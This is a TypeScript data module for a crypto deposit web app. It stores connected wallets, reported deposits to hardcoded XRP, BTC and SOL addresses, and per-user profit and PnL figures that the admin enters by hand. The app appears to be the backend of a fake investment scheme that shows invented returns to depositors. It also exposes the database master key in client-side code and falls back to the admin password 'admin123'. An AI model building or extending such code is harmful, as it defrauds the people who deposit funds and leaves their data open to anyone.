/**
 * "JSON database" backed by JSONBin.io.
 *
 * The whole app state lives in ONE JSON document (a "bin"). We read it, mutate
 * it in memory, and write the whole thing back. That keeps it dead simple and
 * works on Vercel's static hosting — no server needed.
 *
 * Config comes from Vite env vars (see .env.example):
 *   VITE_JSONBIN_BIN_ID  — the bin's id
 *   VITE_JSONBIN_KEY     — your JSONBin Master Key (X-Master-Key)
 */

const BIN_ID = import.meta.env.VITE_JSONBIN_BIN_ID as string | undefined
const KEY = import.meta.env.VITE_JSONBIN_KEY as string | undefined
const BASE = 'https://api.jsonbin.io/v3/b'

export type DepositAsset = 'XRP' | 'BTC' | 'SOL'

/** One connected wallet = one user. Per-user stats live here too. */
export type DbConnection = {
  id: string
  walletId: string
  chain: 'evm' | 'solana'
  address: string
  /** Chosen on first sign-in. */
  username?: string
  /** Total the user has deposited, in USD. */
  deposited?: number
  /** Profit shown on the user's dashboard — admin sets this. */
  profit?: number
  /** PnL shown on the user's dashboard — admin sets this. */
  pnl?: number
  at: string // ISO timestamp of last connect
}

/** A deposit the user says they've made (manual transfer to a deposit address). */
export type DbDeposit = {
  id: string
  address: string // the user's connected wallet
  username?: string
  walletId: string
  asset: DepositAsset
  amountUsd: number
  gasUsd: number
  totalUsd: number
  at: string
}

export type Db = {
  /** Admin password override. Empty = fall back to the default 'admin123'. */
  adminPassword: string
  /** Deposit addresses (also where the gas fee goes). Admin can change these. */
  depositWalletXrp: string
  depositWalletBtc: string
  depositWalletSol: string
  /** Gas fee added on top of each deposit, in USD. */
  gasFeeUsd: number
  connections: DbConnection[]
  deposits: DbDeposit[]
}

/** The deposit addresses the user gave us, used as defaults. */
export const DEFAULT_DB: Db = {
  adminPassword: '',
  depositWalletXrp: 'rJuZ88G5Urddbm1ZZKfsojXLv8omCZ3ruZ',
  depositWalletBtc: 'bc1qrw5yzwwtuc4lfnxm53uuefmlq52cgee04e4lkf',
  depositWalletSol: '9gLTbuPfFqUfAJjHLnCKdP9vK28LuL6Xw28Z6UV6oqdy',
  gasFeeUsd: 5,
  connections: [],
  deposits: [],
}

export function isDbConfigured(): boolean {
  return Boolean(BIN_ID && KEY)
}

function assertConfig() {
  if (!isDbConfigured()) {
    throw new Error(
      'Database not configured. Set VITE_JSONBIN_BIN_ID and VITE_JSONBIN_KEY in your .env file.',
    )
  }
}

const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36)

/** Read the full JSON document. */
export async function getDb(): Promise<Db> {
  assertConfig()
  const res = await fetch(`${BASE}/${BIN_ID}/latest`, {
    headers: { 'X-Master-Key': KEY! },
  })
  if (!res.ok) throw new Error(`Failed to read database (${res.status})`)
  const json = await res.json()
  return { ...DEFAULT_DB, ...(json.record as Partial<Db>) }
}

/** Overwrite the full JSON document. */
export async function saveDb(db: Db): Promise<void> {
  assertConfig()
  const res = await fetch(`${BASE}/${BIN_ID}`, {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json', 'X-Master-Key': KEY! },
    body: JSON.stringify(db),
  })
  if (!res.ok) throw new Error(`Failed to save database (${res.status})`)
}

const sameAddr = (a: string, b: string) => a.toLowerCase() === b.toLowerCase()

/** Record (or refresh) a connected wallet. Deduped by address. */
export async function recordConnection(c: Omit<DbConnection, 'id' | 'at'>) {
  const db = await getDb()
  const now = new Date().toISOString()
  const existing = db.connections.find((x) => sameAddr(x.address, c.address))
  if (existing) {
    existing.at = now
    existing.walletId = c.walletId
    existing.chain = c.chain
  } else {
    db.connections.push({ id: uid(), at: now, deposited: 0, profit: 0, pnl: 0, ...c })
  }
  await saveDb(db)
}

/** Look up a single user by their wallet address. */
export async function getUser(address: string): Promise<DbConnection | null> {
  const db = await getDb()
  return db.connections.find((x) => sameAddr(x.address, address)) ?? null
}

/** Set a user's username (chosen on first sign-in). Upserts the connection. */
export async function setUsername(
  address: string,
  username: string,
  meta?: { walletId: string; chain: 'evm' | 'solana' },
) {
  const db = await getDb()
  const existing = db.connections.find((x) => sameAddr(x.address, address))
  if (existing) {
    existing.username = username
  } else {
    db.connections.push({
      id: uid(),
      address,
      username,
      walletId: meta?.walletId ?? 'unknown',
      chain: meta?.chain ?? 'evm',
      deposited: 0,
      profit: 0,
      pnl: 0,
      at: new Date().toISOString(),
    })
  }
  await saveDb(db)
}

/** Record a deposit and add its amount to the user's running total. */
export async function recordDeposit(p: {
  address: string
  walletId: string
  asset: DepositAsset
  amountUsd: number
  gasUsd: number
}) {
  const db = await getDb()
  const totalUsd = p.amountUsd + p.gasUsd
  const user = db.connections.find((x) => sameAddr(x.address, p.address))
  if (user) user.deposited = (user.deposited ?? 0) + p.amountUsd
  db.deposits.push({
    id: uid(),
    at: new Date().toISOString(),
    username: user?.username,
    totalUsd,
    ...p,
  })
  await saveDb(db)
}

/** The effective admin password: the stored override, or the default. */
export async function getAdminPassword(): Promise<string> {
  const db = await getDb()
  return db.adminPassword?.trim() || 'admin123'
}

/** Admin: set a new password (overrides the default 'admin123'). */
export async function setAdminPassword(password: string) {
  const db = await getDb()
  await saveDb({ ...db, adminPassword: password })
}

/** Admin: update the deposit addresses and gas fee. */
export async function updateDepositSettings(
  patch: Partial<
    Pick<Db, 'depositWalletXrp' | 'depositWalletBtc' | 'depositWalletSol' | 'gasFeeUsd'>
  >,
) {
  const db = await getDb()
  await saveDb({ ...db, ...patch })
}

/** Admin: manually set a user's deposited / profit / pnl figures. */
export async function updateUserStats(
  address: string,
  patch: Partial<Pick<DbConnection, 'deposited' | 'profit' | 'pnl'>>,
) {
  const db = await getDb()
  const user = db.connections.find((x) => sameAddr(x.address, address))
  if (!user) throw new Error('User not found.')
  Object.assign(user, patch)
  await saveDb(db)
}
